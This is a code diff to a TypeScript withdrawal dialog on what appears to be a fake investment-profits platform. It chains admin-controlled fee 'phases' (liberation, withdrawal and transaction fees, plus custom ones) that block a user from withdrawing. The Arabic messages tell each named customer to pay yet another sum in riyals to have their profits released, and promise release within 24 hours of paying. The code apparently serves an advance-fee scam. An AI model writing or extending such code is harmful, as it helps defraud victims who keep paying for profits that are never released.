@@ -784,13 +784,18 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const profitsNum = parseFloat(maxAmount.replace(/,/g, "")) || 0;
   const amountNum = parseFloat(amount.replace(/,/g, "")) || 0;
 
-  const phase2Active = user.phase2Visible;
-  const phase3Active = user.phase3Visible;
+  // مرحلة نشطة = مرئية + لم تكتمل معالجتها (لم تمر 24 ساعة بعد السداد)
+  const phase1Blocking = user.phase1Visible && !(user.liberationFeeStatus === "paid" && isPast24h(user.liberationFeePaidAt));
+  const phase2Active = user.phase2Visible && !(user.withdrawalFeeStatus === "paid" && isPast24h(user.withdrawalFeePaidAt));
+  const phase3Active = user.phase3Visible && !(user.transactionFeeStatus === "paid" && isPast24h(user.transactionFeePaidAt));
 
   const visibleCustomPhase = (() => {
-    const visibleUcps = userCustomPhases.filter((ucp) => ucp.visible);
-    if (visibleUcps.length === 0) return null;
-    const sorted = [...visibleUcps].sort((a, b) => {
+    // نتجاهل المراحل التي اكتملت معالجتها (مسدد + مرور 24 ساعة)
+    const blockingUcps = userCustomPhases.filter(
+      (ucp) => ucp.visible && !(ucp.status === "paid" && isPast24h(ucp.paidAt))
+    );
+    if (blockingUcps.length === 0) return null;
+    const sorted = [...blockingUcps].sort((a, b) => {
       const pa = customPhases.find((p) => p.id === a.phaseId);
       const pb = customPhases.find((p) => p.id === b.phaseId);
       return (pb?.sortOrder ?? 0) - (pa?.sortOrder ?? 0);
@@ -819,7 +824,7 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const netAmount = amountNum - feesNum;
 
   function getFailureMessage() {
-    // مرحلة مخصصة
+    // مرحلة مخصصة لم تكتمل بعد
     if (visibleCustomPhase) {
       const phaseName = visibleCustomPhase.phase?.name ?? "الرسوم الإضافية";
       const failureMsg = visibleCustomPhase.phase?.failureMessage;
@@ -830,31 +835,38 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
         ? interpolatePhaseMessage(failureMsg, userName, visibleCustomPhase.ucp.amount)
         : `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ ${phaseName} "${visibleCustomPhase.ucp.amount}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
     }
-    // المرحلة الثالثة: مبلغ المعاملة
+    // المرحلة الثالثة: مبلغ المعاملة (لم تكتمل بعد)
     if (phase3Active) {
       if (user.transactionFeeStatus === "paid") {
         return `عزيز العميل / ${userName} 🚨 تم تأكيد دفع معاملة تأكيد تحويل الأرباح بنجاح ✅\n يرجى الإنتظار سوف يقوم النظام\n بإتمام عملية سحب الأرباح  خلال أقل من 24 ساعة\nويتم سحب  أرباحك بنجاح ✅ \nنشكر تفهمكم و تعاونكم معنا`;
       }
       return `عزيزي العميل/ ${userName}\nتعذر سحب  الأرباح\nالمتبقي عليكم دفع مبلغ  المعاملة "${user.transactionFee}" ريال لنتمكن من تأكيد تحويل أرباحك بنجاح\n🛑ملاحظة هامة 🚸♨️ الغرض من المعاملة\nمعاملات تسجيل الخروج من الشركة ضمن المتطلبات المتفق عليها🤝👍`;
     }
-    // المرحلة الثانية: رسوم السحب
+    // المرحلة الثانية: رسوم السحب (لم تكتمل بعد)
     if (phase2Active) {
       if (user.withdrawalFeeStatus === "paid") {
         return `عزيز العميل / ${userName} 🚨 تم تأكيد سداد رسوم السحب بنجاح ✅\n يرجى الإنتظار سوف يقوم النظام\n بتحرير الأرباح خلال أقل من 24 ساعة\nويتم سحب ارباحك بنجاح ✅`;
       }
       return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ رسوم السحب "${fees}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
     }
-    // المرحلة الأولى: رسوم التحرير (الوضع الحالي)
+    // المرحلة الأولى: رسوم التحرير (لم تكتمل بعد)
+    if (phase1Blocking) {
+      if (profitsNum === 0) {
+        return `عزيز العميل / ${userName} 🚨 لم يتم إضافة الأرباح الى حسابك اذا كنت مشترك جديد يرجى الانتظار حتى يتم إضافة ارباح الاشتراك الى حسابك و يتم سحب ارباحك بنجاح ✅`;
+      }
+      if (user.liberationFeeStatus === "paid") {
+        return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح بعد سداد رسوم التحرير يرجى الإنتظار سوف يقوم النظام بتحرير حسابك وتفعيل سحب الاموال خلال اقل من 24 ساعة\nويتم سحب ارباحك بنجاح ✅`;
+      }
+      if (user.liberationFee === "0" || user.liberationFee === "") {
+        return `عزيز العميل / ${userName} 🚨 لم يتم إضافة رسوم تحرير الأرباح الى حسابك يرجى الانتظار حتى يتم إضافة رسوم التحرير ويتم سحب ارباحك بنجاح ✅`;
+      }
+      return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ رسوم تحرير الأرباح "${user.liberationFee}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
+    }
+    // كل المراحل اكتملت — رسالة افتراضية
     if (profitsNum === 0) {
-      return `عزيز العميل / ${userName} 🚨 لم يتم إضافة الأرباح الى حسابك اذا كنت مشترك جديد يرجى الانتظار حتى يتم إضافة ارباح الاشتراك الى حسابك و يتم سحب ارباحك بنجاح ✅`;
+      return `عزيز العميل / ${userName} 🚨 لم يتم إضافة الأرباح الى حسابك يرجى الانتظار`;
     }
-    if (user.liberationFeeStatus === "paid") {
-      return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح بعد سداد رسوم التحرير يرجى الإنتظار سوف يقوم النظام بتحرير حسابك وتفعيل سحب الاموال خلال اقل من 24 ساعة\nويتم سحب ارباحك بنجاح ✅`;
-    }
-    if (user.liberationFee === "0" || user.liberationFee === "") {
-      return `عزيز العميل / ${userName} 🚨 لم يتم إضافة رسوم تحرير الأرباح الى حسابك يرجى الانتظار حتى يتم إضافة رسوم التحرير ويتم سحب ارباحك بنجاح ✅`;
-    }
-    return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ رسوم تحرير الأرباح "${user.liberationFee}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
+    return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى التواصل مع الدعم`;
   }
 
   function formatNum(n: number) {
